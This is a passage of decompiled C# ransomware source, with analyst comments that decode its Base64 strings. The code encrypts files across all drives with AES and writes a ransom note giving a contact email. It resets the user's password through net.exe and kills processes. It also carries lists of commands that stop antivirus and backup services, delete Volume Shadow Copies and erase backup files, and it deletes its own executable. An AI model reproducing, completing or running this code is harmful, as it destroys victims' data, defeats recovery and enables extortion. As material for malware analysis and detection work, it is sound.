			catch
			{
			}
		}

		// Token: 0x0600000B RID: 11
		public static void ShowNotification(string OEUeABXDonO = "SW5mb3JtYXRpb24uLi4=", string AbsJbMlYipll = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
		{	// -> Information...  All your files were encrypted, if you want to get them all back, please carefully read the text note located in your desktop...
			new NotifyIcon
			{
				Icon = SystemIcons.Warning,
				Visible = true,
				BalloonTipIcon = ToolTipIcon.Warning,
				BalloonTipTitle = MainCore.DecodeBase64(OEUeABXDonO),
				BalloonTipText = MainCore.DecodeBase64(AbsJbMlYipll)
			}.ShowBalloonTip(30000);
		}

		// Token: 0x0600000C RID: 12
		public static void AddAdminUser(string string_0)
		{
			string str = WindowsIdentity.GetCurrent().Name.Split(new char[]
			{
				'\\'
			})[1].ToString();
			MainCore.CreateProcess("net.exe", "user " + str + " " + string_0);
		}

		// Token: 0x0600000D RID: 13
		public static bool CheckConnect()
		{
			WebRequest webRequest = WebRequest.Create("https://www.google.com/");
			try
			{
				webRequest.GetResponse();
			}
			catch
			{
				return false;
			}
			return true;
		}

		// Token: 0x0600000E RID: 14
		public static void ExecuteCommands()
		{
			MainCore.CreateProcess("cmd.exe", MainCore.DecodeBase64("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
			string str = MainCore.DecodeBase64("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA=="); // -> /C choice /C Y /N /D Y /T 3 & Del 
			Process.Start(new ProcessStartInfo
			{
				Arguments = "\"" + str + "\"" + Assembly.GetEntryAssembly().Location,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
			Environment.Exit(0);
		}

		// Token: 0x0600000F RID: 15
		public static string CheckOS()
		{
			OperatingSystem osversion = Environment.OSVersion;
			Version version = osversion.Version;
			string text = "";
			if (osversion.Platform == PlatformID.Win32Windows)
			{
				int minor = version.Minor;
				if (minor != 0)
				{
					if (minor != 10)
					{
						if (minor == 90)
						{
							text = "Me";
						}
					}
					else if (version.Revision.ToString() == "2222A")
					{
						text = "98SE";
					}
					else
					{
						text = "98";
					}
				}
				else
				{
					text = "95";
				}
			}
			else if (osversion.Platform == PlatformID.Win32NT)
			{
				switch (version.Major)
				{
				case 3:
					text = "NT 3.51";
					break;
				case 4:
					text = "NT 4.0";
					break;
				case 5:
					if (version.Minor == 0)
					{
						text = "2000";
					}
					else
					{
						text = "XP";
					}
					break;
				case 6:
					if (version.Minor == 0)
					{
						text = "Vista";
					}
					else if (version.Minor == 1)
					{
						text = "7";
					}
					else if (version.Minor == 2)
					{
						text = "8";
					}
					else
					{
						text = "8.1";
					}
					break;
				case 10:
					text = "10";
					break;
				}
			}
			if (text != "")
			{
				text = "Windows " + text;
				if (osversion.ServicePack != "")
				{
					text = text + " " + osversion.ServicePack;
				}
			}
			return text;
		}

		// Token: 0x06000010 RID: 16
		public static string PushRansomNote(string string_0)
		{
			string text = Path.GetTempPath() + "\\HOW_TO_DECYPHER_FILES.txt";
			if (!File.Exists(text))
			{
				using (StreamWriter streamWriter = new StreamWriter(text))
				{
					streamWriter.WriteLine(MainCore.DecodeBase64("WW91ciBmaWxlcyB3ZXJlIHNhZmVseSBjeXBoZXJlZC4NCg0KQ29udGFjdDogbXktY29udGFjdC1lbWFpbEBwcm90b25tYWlsLmNvbQ=="));
					/*
					Your files were safely cyphered.

					Contact: my-contact-email@protonmail.com
					*/
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(MainCore.DecodeBase64("S2V5IElkZW50aWZpZXI6IA==")); // -> Key Identifier: 
					streamWriter.WriteLine(string_0);
					return text;
				}
			}
			File.AppendAllText(text, "\r\nAditional KeyId:\r\n" + string_0);
			return text;
		}

		// Token: 0x06000011 RID: 17
		private static void ListDiskToEncrypt(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
		{
			MainCore.ldXpuSFdlzXsf ldXpuSFdlzXsf = new MainCore.ldXpuSFdlzXsf();
			ldXpuSFdlzXsf.wRpHEPAtkvsJOZo = string_1;
			ldXpuSFdlzXsf.vyUBfhhKAo = string_2;
			ldXpuSFdlzXsf.PrmBaLAeEGy = string_3;
			ldXpuSFdlzXsf.VWJpqjqHbP = string_4;
			MainCore.ctSkisxFbkPzS = Encoding.ASCII.GetBytes(ldXpuSFdlzXsf.PrmBaLAeEGy);
			if (string_0[0] == "[auto]")
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				if (drives.Length > 0)
				{
					for (int i = 0; i < drives.Length; i++)
					{
						if (drives[i].IsReady && !MainCore.siKfLgBTOtPOl.Contains(drives[i].Name))
						{
							MainCore.siKfLgBTOtPOl.Add(drives[i].Name);
						}
					}
				}
			}
			else
			{
				for (int i = 0; i < string_0.Length; i++)
				{
					if (!MainCore.siKfLgBTOtPOl.Contains(string_0[i]))
					{
						MainCore.siKfLgBTOtPOl.Add(string_0[i]);
					}
				}
			}
			if (MainCore.siKfLgBTOtPOl.Contains(MainCore.DecodeBase64("Qzpc")) && MainCore.XKCeykQXWEYgem == "YES") // -> C:\
			{
				MainCore.siKfLgBTOtPOl.Remove(MainCore.DecodeBase64("Qzpc")); // -> C:\
			}
			using (List<string>.Enumerator enumerator = MainCore.siKfLgBTOtPOl.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					ThreadStart threadStart = null;
					MainCore.uKOVEKzchnPsIO uKOVEKzchnPsIO = new MainCore.uKOVEKzchnPsIO();
					uKOVEKzchnPsIO.rvBvEQIyVzuxrLj = ldXpuSFdlzXsf;
					uKOVEKzchnPsIO.KxwFjccKfD = enumerator.Current;
					if (MainCore.FsmxXwwVyXze == "YES")
					{
						if (threadStart == null)
						{
							threadStart = new ThreadStart(uKOVEKzchnPsIO.<Crypt>b__d);
						}
						Thread thread = new Thread(threadStart);
						thread.Priority = ThreadPriority.Highest;
						thread.IsBackground = false;
						thread.Start();
						thread.Join();
					}
					else
					{
						MainCore.OP(uKOVEKzchnPsIO.KxwFjccKfD, ldXpuSFdlzXsf.wRpHEPAtkvsJOZo, ldXpuSFdlzXsf.VWJpqjqHbP, ldXpuSFdlzXsf.vyUBfhhKAo, ldXpuSFdlzXsf.PrmBaLAeEGy);
					}
				}
			}
		}

		// Token: 0x06000012 RID: 18
		public static void OP(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>
			{
				""
			};
			if (MainCore.oiSsXsWUMOtEp == "NO")
			{
				list = MainCore.Ressources(string_0, string_1, string_2, string_3, string_4);
			}
			else
			{
				list = MainCore.jtxivXeSYrLUbhy.SearchFiles(string_0);
				foreach (string text in string_1)
				{
					using (List<string>.Enumerator enumerator = list.GetEnumerator())
					{
						IL_33A:
						while (enumerator.MoveNext())
						{
							string text2 = enumerator.Current;
							if (string_3.Length != 0)
							{
								foreach (string value in string_3)
								{
									if (text2.EndsWith(value))
									{
										goto IL_33A;
									}
								}
							}
							if ((!(MainCore.oCUqHyphdF == "NO") || text2.EndsWith(text)) && !MainCore.CfvwdOobMuXeStMb.Contains(text2))
							{
								if (MainCore.zKSeEXflLrlh == "YES")
								{
									try
									{
										if (Kill.ReadStream(text2))
										{
											Kill.KillProcess(text2);
										}
									}
									catch
									{
									}
								}
								MainCore.CfvwdOobMuXeStMb.Add(text2);
								if (!MainCore.CSiGcEXgTf.Contains(Path.GetDirectoryName(text2)))
								{
									MainCore.CSiGcEXgTf.Add(Path.GetDirectoryName(text2));
								}
								try
								{
									FileStream fileStream = new FileStream(text2, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
									if (MainCore.fCiJsjNmDGYo == "YES" && fileStream.Length > (long)(Convert.ToInt32(MainCore.tsQtKfDKZIMNuO) * 1024 * 1024) && !list2.Contains(text))
									{
										if (MainCore.uySjNlajuEE == "YES")
										{
											foreach (string value2 in MainCore.ulDHvcBRgNNLZtzS)
											{
												if (text2.ToLower().EndsWith(value2) && MainCore.BtOESQEmmPY == "YES")
												{
													if ((long)(Convert.ToInt32(MainCore.uOyyfFtzedTPufn) * 1024 * 1024) <= fileStream.Length)
													{
														continue;
													}
													try
													{
														ID.GetIDVictim("URL", "USERNAME", "ACCESO", text2);
														continue;
													}
													catch
													{
														continue;
													}
												}
												if (text2.ToLower().EndsWith(value2) && MainCore.BtOESQEmmPY == "NO")
												{
													try
													{
														ID.GetIDVictim("URL", "USERNAME", "ACCESO", text2);
													}
													catch
													{
													}
												}
											}
										}
										fileStream.Dispose();
										byte[] byte_ = Encryption.ReadFileData(text2, Convert.ToInt32(MainCore.tsQtKfDKZIMNuO) * 1024 * 1024);
										byte[] byte_2 = Encryption.EncryptFile(byte_, Encoding.ASCII.GetBytes(string_4), new byte[]
										{
											1,
											2,
											3,
											4,
											5,
											6,
											7,
											8
										});
										Encryption.WhiteEncryptedFile(text2, byte_2);
										if (string_2 != ".*")
										{
											File.Move(text2, text2 + string_2);
										}
									}
									else if (string_2 != ".*")
									{
										MainCore.EncryptData(text2, text2 + string_2, MainCore.ctSkisxFbkPzS);
									}
									else
									{
										MainCore.EncryptData(text2, text2 + ".part", MainCore.ctSkisxFbkPzS);
									}
								}
								catch (Exception)
								{
								}
							}
						}
					}
				}
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00004A30 File Offset: 0x00002C30
		public static void GXekGISbFWfkZ(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
		{
			Parallel.ForEach<string>(string_0, new Action<string>(new MainCore.WbDnpXySnYPBD
			{
				fevfiSigOoErXD = list_0,
				RryKduFtzbfiPI = string_1,
				DhKhIlMiANCZ = string_2,
				KRFQhWmJuhVexr = string_3,
				UIEWVHYeVoR = new List<string>
				{
					""
				}
			}.<WorkerCrypter2>b__15));
		}

		// Token: 0x06000014 RID: 20
		private static void EncryptData(string string_0, string string_1, byte[] byte_0)
		{
			try
			{
				byte[] salt = new byte[]
				{
					1,
					2,
					3,
					4,
					5,
					6,
					7,
					8
				};
				FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Padding = PaddingMode.Zeros;
				rijndaelManaged.Mode = CipherMode.CBC;
				CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
				FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
				int num;
				while ((num = fileStream2.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num);
				}
				fileStream2.Dispose();
				cryptoStream.Dispose();
				fileStream.Dispose();
				try
				{
					if (string_1.Length > 0)
					{
						FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						if (MainCore.uySjNlajuEE == "YES")
						{
							foreach (string value in MainCore.ulDHvcBRgNNLZtzS)
							{
								if (string_0.ToLower().EndsWith(value) && MainCore.BtOESQEmmPY == "YES")
								{
									if ((long)(Convert.ToInt32(MainCore.uOyyfFtzedTPufn) * 1024 * 1024) <= fileStream3.Length)
									{
										continue;
									}
									try
									{
										ID.GetIDVictim("URL", "USERNAME", "ACCESO", string_0);
										continue;
									}
									catch
									{
										continue;
									}
								}
								if (string_0.ToLower().EndsWith(value) && MainCore.BtOESQEmmPY == "NO")
								{
									try
									{
										ID.GetIDVictim("URL", "USERNAME", "ACCESO", string_0);
									}
									catch
									{
									}
								}
							}
						}
						fileStream3.Dispose();
						int num2 = 1000000;
						for (;;)
						{
							try
							{
								while (File.Exists(string_0) && num2 >= 0)
								{
									File.Delete(string_0);
								}
								break;
							}
							catch
							{
								num2--;
							}
						}
						if (string_1.EndsWith(".part"))
						{
							File.Move(string_1, string_1.Replace(".part", ""));
						}
					}
					else
					{
						try
						{
							File.Delete(string_1);
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000015 RID: 21
		private static void InitEncryption(string string_0, string string_1, byte[] byte_0)
		{
			ThreadStart threadStart = null;
			ThreadStart threadStart2 = null;
			MainCore.IzImQwKqnmdl izImQwKqnmdl = new MainCore.IzImQwKqnmdl();
			izImQwKqnmdl.MQXFfvSrdXstlCz = string_0;
			izImQwKqnmdl.GhQNYBCsZpGoSQ = string_1;
			try
			{
				byte[] salt = new byte[]
				{
					1,
					2,
					3,
					4,
					5,
					6,
					7,
					8
				};
				string ghQNYBCsZpGoSQ = izImQwKqnmdl.GhQNYBCsZpGoSQ;
				FileStream fileStream = new FileStream(ghQNYBCsZpGoSQ, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Padding = PaddingMode.Zeros;
				rijndaelManaged.Mode = CipherMode.CBC;
				CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
				FileStream fileStream2 = new FileStream(izImQwKqnmdl.MQXFfvSrdXstlCz, FileMode.Open);
				int num;
				while ((num = fileStream2.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num);
				}
				fileStream2.Dispose();
				cryptoStream.Dispose();
				fileStream.Dispose();
				try
				{
					if (izImQwKqnmdl.GhQNYBCsZpGoSQ.Length > 0)
					{
						FileStream fileStream3 = new FileStream(izImQwKqnmdl.MQXFfvSrdXstlCz, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						if (MainCore.uySjNlajuEE == "YES")
						{
							foreach (string value in MainCore.ulDHvcBRgNNLZtzS)
							{
								if (izImQwKqnmdl.MQXFfvSrdXstlCz.ToLower().EndsWith(value) && MainCore.BtOESQEmmPY == "YES")
								{
									if ((long)(Convert.ToInt32(MainCore.uOyyfFtzedTPufn) * 1024 * 1024) <= fileStream3.Length)
									{
										continue;
									}
									try
									{
										ID.GetIDVictim("URL", "USERNAME", "ACCESO", izImQwKqnmdl.MQXFfvSrdXstlCz);
										continue;
									}
									catch
									{
										continue;
									}
								}
								if (izImQwKqnmdl.MQXFfvSrdXstlCz.ToLower().EndsWith(value) && MainCore.BtOESQEmmPY == "NO")
								{
									try
									{
										ID.GetIDVictim("URL", "USERNAME", "ACCESO", izImQwKqnmdl.MQXFfvSrdXstlCz);
									}
									catch
									{
									}
								}
							}
						}
						fileStream3.Dispose();
						if (threadStart == null)
						{
							threadStart = new ThreadStart(izImQwKqnmdl.<Encrypt2>b__18);
						}
						new Thread(threadStart).Start();
						if (izImQwKqnmdl.GhQNYBCsZpGoSQ.EndsWith(".part"))
						{
							File.Move(izImQwKqnmdl.GhQNYBCsZpGoSQ, izImQwKqnmdl.GhQNYBCsZpGoSQ.Replace(".part", ""));
						}
					}
					else
					{
						if (threadStart2 == null)
						{
							threadStart2 = new ThreadStart(izImQwKqnmdl.<Encrypt2>b__19);
						}
						new Thread(threadStart2).Start();
					}
				}
				catch
				{
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x04000001 RID: 1
		public static string xQMkqhCYTvWMq = "EVET";

		// Token: 0x04000002 RID: 2
		public static byte[] ctSkisxFbkPzS = null;

		// Token: 0x04000003 RID: 3
		public static string FFbMRUzulqEpb = "NO";

		// Token: 0x04000004 RID: 4
		public static string HJhinhnlOMNxIX = "100000000";

		// Token: 0x04000005 RID: 5
		public static List<string> siKfLgBTOtPOl = new List<string>();

		// Token: 0x04000006 RID: 6
		public static List<string> hkQMoFyHzQ = new List<string>();

		// Token: 0x04000007 RID: 7
		public static string JNHKDqKmSycXVyA = "NO";

		// Token: 0x04000008 RID: 8
		public static string KRFQhWmJuhVexr = "";

		// Token: 0x04000009 RID: 9
		public static string SMVGmorJMiSRUva = "NO";

		// Token: 0x0400000A RID: 10
		public static int hXaNTqTbRnpr = 0;

		// Token: 0x0400000B RID: 11
		public static string zKSeEXflLrlh = "NO";

		// Token: 0x0400000C RID: 12
		public static string LDNdJBbfsdAY = "NO";

		// Token: 0x0400000D RID: 13
		public static string kqxgiwAmxJZAF = "NO";

		// Token: 0x0400000E RID: 14
		public static string efojwxvnMIbXXP = "0";

		// Token: 0x0400000F RID: 15
		public static string IUvwjPVcqFrE = "YES";

		// Token: 0x04000010 RID: 16
		public static string QDIBAwivbzugjctV = "NO";

		// Token: 0x04000011 RID: 17
		public static string PVCmRrdzBeoM = "NO";

		// Token: 0x04000012 RID: 18
		public static string IBSndtoMdgy = "NO";

		// Token: 0x04000013 RID: 19
		public static List<string> wiZlVeXAvqcJt = new List<string>
		{
			MainCore.DecodeBase64("bHNhc3MuZXhl"), // -> lsass.exe
			MainCore.DecodeBase64("c3ZjaHN0LmV4ZQ=="), // -> svchst.exe
			MainCore.DecodeBase64("Y3Jjc3MuZXhl"), // -> crcss.exe
			MainCore.DecodeBase64("Y2hyb21lMzIuZXhl"), // -> chrome32.exe
			MainCore.DecodeBase64("ZmlyZWZveC5leGU="), // -> firefox.exe
			MainCore.DecodeBase64("Y2FsYy5leGU="), // -> calc.exe
			MainCore.DecodeBase64("bXlzcWxkLmV4ZQ=="), // -> mysqld.exe
			MainCore.DecodeBase64("ZGxsaHN0LmV4ZQ=="), // -> dllhst.exe
			MainCore.DecodeBase64("b3BlcmEzMi5leGU="), // -> opera32.exe
			MainCore.DecodeBase64("bWVtb3AuZXhl"), // -> memop.exe
			MainCore.DecodeBase64("c3Bvb2xjdi5leGU="), // -> spoolcv.exe
			MainCore.DecodeBase64("Y3RmbW9tLmV4ZQ=="), // -> ctfmom.exe
			MainCore.DecodeBase64("U2t5cGVBcHAuZXhl") // -> SkypeApp.exe
		};

		// Token: 0x04000014 RID: 20
		public static List<string> CSiGcEXgTf = new List<string>();

		// Token: 0x04000015 RID: 21
		public static string ELyYGppfySYfq = "YES";

		// Token: 0x04000016 RID: 22
		public static string udJVdpbosFv = "NO";

		// Token: 0x04000017 RID: 23
		public static string nEFvYMIALr = "NO";

		// Token: 0x04000018 RID: 24
		public static List<string> CfvwdOobMuXeStMb = new List<string>();

		// Token: 0x04000019 RID: 25
		public static string YkwRnYlFytdkH = "NO";

		// Token: 0x0400001A RID: 26
		private static string YQBusMLxsiehe = "3747bdbf-0ef0-42d8-9234-70d68801f407"; // CLSID ?

		// Token: 0x0400001B RID: 27
		public static string FsmxXwwVyXze = "YES";

		// Token: 0x0400001C RID: 28
		public static string OZagXxYpUbG = "NO";

		// Token: 0x0400001D RID: 29
		public static List<string> ypieyuCOltLWYFl = new List<string>
		{
			MainCore.DecodeBase64("c3RvcCBhdnBzdXMgL3k="), // -> stop avpsus /y
			MainCore.DecodeBase64("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="), // -> stop McAfeeDLPAgentService /y
			MainCore.DecodeBase64("c3RvcCBtZmV3YyAveQ=="), // -> stop mfewc /y
			MainCore.DecodeBase64("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"), // -> stop BMR Boot Service /y
			MainCore.DecodeBase64("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="), // -> stop NetBackup BMR MTFTP Service /y
			MainCore.DecodeBase64("c3RvcCBEZWZXYXRjaCAveQ=="), // -> stop DefWatch /y
			MainCore.DecodeBase64("c3RvcCBjY0V2dE1nciAveQ=="), // -> stop ccEvtMgr /y
			MainCore.DecodeBase64("c3RvcCBjY1NldE1nciAveQ=="), // -> stop ccSetMgr /y
			MainCore.DecodeBase64("c3RvcCBTYXZSb2FtIC95"), // -> stop SavRoam /y
			MainCore.DecodeBase64("c3RvcCBSVFZzY2FuIC95"), // -> stop RTVscan /y
			MainCore.DecodeBase64("c3RvcCBRQkZDU2VydmljZSAveQ=="), // -> stop QBFCService /y
			MainCore.DecodeBase64("c3RvcCBRQklEUFNlcnZpY2UgL3k="), // -> stop QBIDPService /y
			MainCore.DecodeBase64("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="), // -> stop Intuit.QuickBooks.FCS /y
			MainCore.DecodeBase64("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="), // -> stop QBCFMonitorService /y
			MainCore.DecodeBase64("c3RvcCBZb29CYWNrdXAgL3k="), // -> stop YooBackup /y
			MainCore.DecodeBase64("c3RvcCBZb29JVCAveQ=="), // -> stop YooIT /y
			MainCore.DecodeBase64("c3RvcCB6aHVkb25nZmFuZ3l1IC95"), // -> stop zhudongfangyu /y
			MainCore.DecodeBase64("c3RvcCBzdGNfcmF3X2FnZW50IC95"), // -> stop stc_raw_agent /y
			MainCore.DecodeBase64("c3RvcCBWU05BUFZTUyAveQ=="), // -> stop VSNAPVSS /y
			MainCore.DecodeBase64("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="), // -> stop VeeamTransportSvc /y
			MainCore.DecodeBase64("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"), // -> stop VeeamDeploymentService /y
			MainCore.DecodeBase64("c3RvcCBWZWVhbU5GU1N2YyAveQ=="), // -> stop VeeamNFSSvc /y
			MainCore.DecodeBase64("c3RvcCB2ZWVhbSAveQ=="), // -> stop veeam /y
			MainCore.DecodeBase64("c3RvcCBQRFZGU1NlcnZpY2UgL3k="), // -> stop PDVFSService /y
			MainCore.DecodeBase64("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="), // -> stop BackupExecVSSProvider /y
			MainCore.DecodeBase64("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="), // -> stop BackupExecAgentAccelerator /y
			MainCore.DecodeBase64("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"), // -> stop BackupExecAgentBrowser /y
			MainCore.DecodeBase64("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"), // -> stop BackupExecDiveciMediaService /y
			MainCore.DecodeBase64("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"), // -> stop BackupExecJobEngine /y
			MainCore.DecodeBase64("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="), // -> stop BackupExecManagementService /y
			MainCore.DecodeBase64("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="), // -> stop BackupExecRPCService /y
			MainCore.DecodeBase64("c3RvcCBBY3JTY2gyU3ZjIC95"), // -> stop AcrSch2Svc /y
			MainCore.DecodeBase64("c3RvcCBBY3JvbmlzQWdlbnQgL3k="), // -> stop AcronisAgent /y
			MainCore.DecodeBase64("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"), // -> stop CASAD2DWebSvc /y
			MainCore.DecodeBase64("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="), // -> stop CAARCUpdateSvc /y
			MainCore.DecodeBase64("c3RvcCBzb3Bob3MgL3k=") // -> stop sophos /y
		};

		// Token: 0x0400001E RID: 30
		public static List<string> YDWHvbVPBJ = new List<string>
		{
			MainCore.DecodeBase64("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="), // -> config SQLTELEMETRY start= disabled
			MainCore.DecodeBase64("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"), // -> config SQLTELEMETRY$ECWDB2 start= disabled
			MainCore.DecodeBase64("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="), // -> config SQLWriter start= disabled
			MainCore.DecodeBase64("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk") // -> config SstpSvc start= disabled
		};

		// Token: 0x0400001F RID: 31
		public static List<string> AgdpzRigFOYhsqvH = new List<string>
		{
			MainCore.DecodeBase64("L0lNIG1zcHViLmV4ZSAvRg=="), // -> /IM mspub.exe /F
			MainCore.DecodeBase64("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="), // -> /IM mydesktopqos.exe /F
			MainCore.DecodeBase64("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G") // -> /IM mydesktopservice.exe /F
		};

		// Token: 0x04000020 RID: 32
		public static List<string> WRakAWHNtJErZ = new List<string>
		{
			MainCore.DecodeBase64("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ="), // -> Delete Shadows /all /quiet
			MainCore.DecodeBase64("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="), // -> resize shadowstorage /for=c: /on=c: /maxsize=401MB
			MainCore.DecodeBase64("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"), // -> resize shadowstorage /for=c: /on=c: /maxsize=unbounded
			MainCore.DecodeBase64("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="), // -> resize shadowstorage /for=d: /on=d: /maxsize=401MB
			MainCore.DecodeBase64("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"), // -> resize shadowstorage /for=d: /on=d: /maxsize=unbounded
			MainCore.DecodeBase64("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="), // -> resize shadowstorage /for=e: /on=e: /maxsize=401MB
			MainCore.DecodeBase64("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"), // -> resize shadowstorage /for=e: /on=e: /maxsize=unbounded
			MainCore.DecodeBase64("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="), // -> resize shadowstorage /for=f: /on=f: /maxsize=401MB
			MainCore.DecodeBase64("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"), // -> resize shadowstorage /for=f: /on=f: /maxsize=unbounded
			MainCore.DecodeBase64("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="), // -> resize shadowstorage /for=g: /on=g: /maxsize=401MB
			MainCore.DecodeBase64("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"), // -> resize shadowstorage /for=g: /on=g: /maxsize=unbounded
			MainCore.DecodeBase64("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="), // -> resize shadowstorage /for=h: /on=h: /maxsize=401MB
			MainCore.DecodeBase64("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"), // -> resize shadowstorage /for=h: /on=h: /maxsize=unbounded
			MainCore.DecodeBase64("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ=") // -> Delete Shadows /all /quiet
		};

		// Token: 0x04000021 RID: 33
		public static List<string> PMQqUDKVTQJ = new List<string>
		{
			MainCore.DecodeBase64("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
			// -> /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
			MainCore.DecodeBase64("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
			// -> /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk
